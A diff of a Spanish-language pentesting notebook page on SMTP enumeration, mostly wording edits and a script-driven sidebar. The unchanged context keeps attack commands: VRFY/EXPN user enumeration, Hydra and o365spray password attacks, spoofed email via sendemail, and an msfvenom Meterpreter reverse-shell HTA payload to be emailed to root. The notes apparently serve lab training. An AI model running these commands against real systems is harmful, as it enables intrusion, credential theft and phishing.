@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
     <title>25 - SMTP | Notebook</title>
+    <script src="/theme.js"></script>
     <link rel="stylesheet" href="/section.css" />
   </head>
   <body>
@@ -12,59 +13,7 @@
       <a class="back-link" href="/notebook.html">~/notebook</a>
 
       <section class="notebook-workspace" aria-label="Notebook">
-        <aside class="notebook-sidebar" aria-label="Explorador de apuntes">
-          <h1>Notebook</h1>
-
-          <nav class="vault-tree" aria-label="Ficheros">
-            <a class="vault-file" href="/notebook.html">Inicio</a>
-            <details class="vault-folder">
-              <summary>Pivoting</summary>
-              <a class="vault-file" href="/notebook/pivoting/ligolo.html">Ligolo</a>
-              <a class="vault-file" href="/notebook/pivoting/metasploit.html">Metasploit</a>
-              <a class="vault-file" href="/notebook/pivoting/chisel-socat.html">Chisel y Socat</a>
-            </details>
-            <details class="vault-folder">
-              <summary>Hacking Wifi</summary>
-              <a class="vault-file" href="/notebook/hacking-wifi/captura-wpa-wpa2.html">Captura WPA/WPA2</a>
-            </details>
-            <details class="vault-folder">
-              <summary>Enumeración de Puertos</summary>
-              <a class="vault-file" href="/notebook/enumeracion-puertos/21-ftp.html">21 - FTP</a>
-              <a class="vault-file" href="/notebook/enumeracion-puertos/22-ssh.html">22 - SSH</a>
-              <a class="vault-file" href="/notebook/enumeracion-puertos/23-telnet.html">23 - Telnet</a>
-              <a class="vault-file is-active" href="/notebook/enumeracion-puertos/25-smtp.html">25 - SMTP</a>
-              <a class="vault-file" href="/notebook/enumeracion-puertos/53-dns.html">53 - DNS</a>
-              <a class="vault-file" href="/notebook/enumeracion-puertos/79-finger.html">79 - Finger</a>
-              <a class="vault-file" href="/notebook/enumeracion-puertos/80-443-http-https.html">80,443 - HTTP,HTTPS</a>
-              <a class="vault-file" href="/notebook/enumeracion-puertos/88-kerberos.html">88 - Kerberos</a>
-              <a class="vault-file" href="/notebook/enumeracion-puertos/135-rpc.html">135 - RPC</a>
-              <a class="vault-file" href="/notebook/enumeracion-puertos/139-445-smb.html">139,445 - SMB</a>
-              <a class="vault-file" href="/notebook/enumeracion-puertos/143-imap.html">143 - IMAP</a>
-              <a class="vault-file" href="/notebook/enumeracion-puertos/161-snmp-udp.html">161 - SNMP (UDP)</a>
-              <a class="vault-file" href="/notebook/enumeracion-puertos/389-636-3268-3269-ldap.html">389, 636, 3268, 3269 - LDAP</a>
-              <a class="vault-file" href="/notebook/enumeracion-puertos/1433-mssql.html">1433 - MSSQL</a>
-              <a class="vault-file" href="/notebook/enumeracion-puertos/1521-oracle-database.html">1521 - Oracle Database</a>
-              <a class="vault-file" href="/notebook/enumeracion-puertos/2049-nfs.html">2049 - NFS</a>
-              <a class="vault-file" href="/notebook/enumeracion-puertos/3128-squid-proxy.html">3128 - Squid Proxy</a>
-              <a class="vault-file" href="/notebook/enumeracion-puertos/3306-mysql.html">3306 - MySQL</a>
-              <a class="vault-file" href="/notebook/enumeracion-puertos/3389-rdp.html">3389 - RDP</a>
-              <a class="vault-file" href="/notebook/enumeracion-puertos/5432-5437-postgresql.html">5432,5437 - PostgreSQL</a>
-              <a class="vault-file" href="/notebook/enumeracion-puertos/5985-5986-winrm.html">5985,5986 - WinRM</a>
-            </details>
-            <details class="vault-folder">
-              <summary>Escalada de Privilegios</summary>
-              <details class="vault-folder vault-subfolder" open>
-                <summary>Linux</summary>
-                <a class="vault-file" href="/notebook/escalada-privilegios/linux/sudoers.html">Sudoers</a>
-                <a class="vault-file" href="/notebook/escalada-privilegios/linux/suid.html">SUID</a>
-                <a class="vault-file" href="/notebook/escalada-privilegios/linux/grupos-vulnerables.html">Grupos Vulnerables</a>
-              </details>
-              <details class="vault-folder vault-subfolder">
-                <summary>Windows</summary>
-              </details>
-            </details>
-          </nav>
-        </aside>
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
 
         <article class="note-panel is-active" id="25-smtp">
           <div class="note-tabbar">
@@ -84,7 +33,7 @@
             <p class="eyebrow">enumeración de puertos / smtp</p>
             <h2>25 - SMTP</h2>
 
-            <p>Puede correr también en los puertos <code>465</code> y <code>587</code> cifrado</p>
+            <p>También puede aparecer en los puertos <code>465</code> y <code>587</code> cuando se usa SMTP con TLS implícito o STARTTLS.</p>
 
             <h3>Acceso SMTP</h3>
 
@@ -100,7 +49,7 @@ nc -vn &lt;ip_victima&gt; 25</code></pre>
             <h3>Enumeración</h3>
 
             <section class="code-card">
-              <h3>Enumerar comandos válidos a ejecutar VRFY/EXPN/RCPT TO (Comando que permite enumerar usuarios)</h3>
+              <h3>Enumerar comandos válidos: VRFY, EXPN y RCPT TO</h3>
               <pre><code>telnet demo.ine.local 25
 HELO &lt;attacker.xyz&gt; # Cualquier nombre.xyz
 EHLO &lt;attacker.xyz&gt;
@@ -112,7 +61,7 @@ HELP</code></pre>
               <pre><code># Verificar con VRFY
 VRFY admin 
 VRFY admin@openmailbox.xyz 
-# Verificar con EXPN (Permite enumera usuarios por listas como &#x27;all&#x27;)
+# Verificar con EXPN (permite enumerar usuarios por listas como &#x27;all&#x27;)
 EXPN admin 
 EXPN all
 # Verificar con RCPT TO
@@ -124,7 +73,7 @@ RCPT TO:admin</code></pre>
               <h3>Enumerar Usuarios</h3>
               <pre><code>smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t demo.ine.local
 
-# -M se puede cambiar tambien por RCPT, EXPN
+# -M se puede cambiar también por RCPT o EXPN
 smtp-user-enum -M VRFY -U /usr/share/commix/src/txt/usernames.txt -D &lt;DOMINIO.COM&gt; -t &lt;IP_TARGET&gt;</code></pre>
             </section>
 
@@ -140,7 +89,7 @@ exploit</code></pre>
             <h3>Fuerza Bruta</h3>
 
             <section class="code-card">
-              <h3>Fuerza Bruta a lista usuarios</h3>
+              <h3>Fuerza bruta contra POP3 con lista de usuarios</h3>
               <pre><code>hydra -L &lt;users.txt&gt; -p &lt;&#x27;Password123!&#x27;&gt; -f &lt;ip_target&gt; pop3</code></pre>
             </section>
 
@@ -159,7 +108,7 @@ MAIL FROM: &lt;remitente@dominio&gt;</code></pre>
             <h3>Versiones vulnerables</h3>
 
             <section class="code-card">
-              <h3>Versión de SMPT: Metasploit</h3>
+              <h3>Versión de SMTP: Metasploit</h3>
               <pre><code># Escaneo de versión SMTP
 msfconsole -q 
 use auxiliary/scanner/smtp/smtp_version
@@ -184,15 +133,15 @@ run</code></pre>
               <pre><code>https://www.exploit-db.com/exploits/47984</code></pre>
             </section>
 
-            <h3>Enviar Mails maliciosos</h3>
+            <h3>Enviar correos en laboratorio</h3>
 
             <section class="code-card">
-              <h3>Consola: Enviar mail falso a root suplantando a admin</h3>
+              <h3>Consola: enviar correo falso a root suplantando a admin</h3>
               <pre><code>sendemail -f admin@&lt;dominio.xyz&gt; -t root@&lt;servidor_correo&gt;.xyz -s demo.ine.local -u &quot;Asunto&quot; -m &quot;Mensaje&quot; -o tls=no</code></pre>
             </section>
 
             <section class="code-card">
-              <h3>Consola: Enviar payload por mail a root</h3>
+              <h3>Consola: enviar adjunto controlado por correo</h3>
               <pre><code># Creamos payload
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;ip_kali&gt; LPORT=4444 -f hta-psh -o shell.hta
 
@@ -235,11 +184,11 @@ Admin
               <pre><code>python3 o365spray.py --spray -U &lt;usersfound.txt&gt; -p &lt;&#x27;March2022!&#x27;&gt; --count 1 --lockout 1 --domain &lt;domain.xyz&gt;</code></pre>
             </section>
 
-            <p>Herramientas <a href="https://github.com/dafthack/MailSniper">MailSniper</a> también para Microsoft Office 365 o <a href="https://github.com/ustayready/CredKing">CredKing</a> para Gmail</p>
+            <p>Herramientas como <a href="https://github.com/dafthack/MailSniper">MailSniper</a> para Microsoft Office 365 o <a href="https://github.com/ustayready/CredKing">CredKing</a> para Gmail pueden ayudar en auditorías autorizadas.</p>
 
             <h3>Open Relay</h3>
 
-            <p>Podemos aprovechar esto para realizar phishing enviando correos electrónicos como usuarios inexistentes o suplantando el correo electrónico de otra persona</p>
+            <p>Un servidor open relay permite enviar correos hacia terceros sin controles adecuados. En un pentest autorizado se valida el riesgo de suplantación y abuso para phishing, sin enviar campañas reales fuera del alcance.</p>
 
             <section class="code-card">
               <h3>Verificar si se permite open-relay</h3>
@@ -312,7 +261,9 @@ QUIT</code></pre>
         </article>
       </section>
     </main>
-    <script src="/notebook/folder-state.js"></script>`r`n    <script src="/notebook/search.js"></script>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
   </body>
 </html>
 
